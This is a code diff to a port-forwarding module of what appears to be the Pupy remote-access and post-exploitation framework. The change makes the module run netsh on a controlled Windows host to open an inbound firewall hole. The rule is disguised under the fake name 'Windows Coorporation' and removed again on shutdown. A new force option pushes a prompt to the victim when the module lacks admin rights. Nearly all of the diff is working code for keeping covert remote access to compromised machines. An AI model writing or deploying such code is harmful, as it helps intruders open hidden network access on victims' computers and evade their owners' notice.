@@ -11,6 +11,7 @@ import logging
 import struct
 import traceback
 import time
+import subprocess
 
 __class_name__="PortFwdModule"
 
@@ -125,9 +126,10 @@ class PortFwdModule(PupyModule):
         self.current_id=1
 
     def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='socks5proxy', description=self.__doc__)
+        self.arg_parser = PupyArgumentParser(prog='portfwd', description=self.__doc__)
         self.arg_parser.add_argument('-L', '--local', help="Local port forward")
         self.arg_parser.add_argument('-R', '--remote', help="Remote port forward")
+        self.arg_parser.add_argument('-F', '--force', action='store_true', help="Try to open a port without admin rights (it will prompt a pop up to the end user)")
         self.arg_parser.add_argument('-k', '--kill', type=int, metavar="<id>", help="stop a port forward")
 
     def stop_daemon(self):
@@ -182,6 +184,21 @@ class PortFwdModule(PupyModule):
             except Exception:
                 self.error("ports must be integers")
                 return
+
+            if "Windows" in self.client.desc["platform"]:
+                self.client.load_package("psutil")
+                self.client.load_package("pupwinutils.processes")
+                if self.client.conn.modules['pupwinutils.processes'].isUserAdmin() == True:
+                    # create new firewall rule
+                    cmd = 'netsh advfirewall firewall add rule name="Windows Coorporation" dir=in action=allow protocol=TCP localport=%s' % str(remote_port)
+                    output = self.client.conn.modules.subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+                    if 'ok' in output.lower():
+                        self.success("Firewall rule created successfully")
+                else:
+                    if not args.force:
+                        self.error("Firewall modification needs admin rights. Try using -F to force to open a port (it will prompt a pop up to the end user)")
+                        return
+
             self.client.load_package("pupyutils.portfwd")
             remote_server = self.client.conn.modules["pupyutils.portfwd"].ThreadedRemotePortFwdServer((remote_addr, remote_port), callback=get_remote_port_fwd_cb((remote_addr, remote_port),(local_addr, local_port)))
             self.portfwd_dic[self.current_id]=remote_server
@@ -191,6 +208,19 @@ class PortFwdModule(PupyModule):
 
         elif args.kill:
             if args.kill in self.portfwd_dic:
+                
+                if "Windows" in self.client.desc["platform"]:
+                    try:
+                        # maybe there is a cleaner way to get the port 
+                        tmp = str(self.portfwd_dic[args.kill]).split()
+                        port = int(tmp[len(tmp)-1].replace(')', '').replace('>', ''))
+                        cmd = 'netsh advfirewall firewall delete rule name="Windows Coorporation" protocol=tcp localport=%s' % str(port)
+                        output = self.client.conn.modules.subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+                        if 'ok' in output.lower():
+                            self.success("Firewall rule deleted successfully")
+                    except:
+                        self.error("Cannot remove the firewall rule")
+                
                 desc=str(self.portfwd_dic[args.kill])
                 self.portfwd_dic[args.kill].shutdown()
                 self.portfwd_dic[args.kill].server_close()
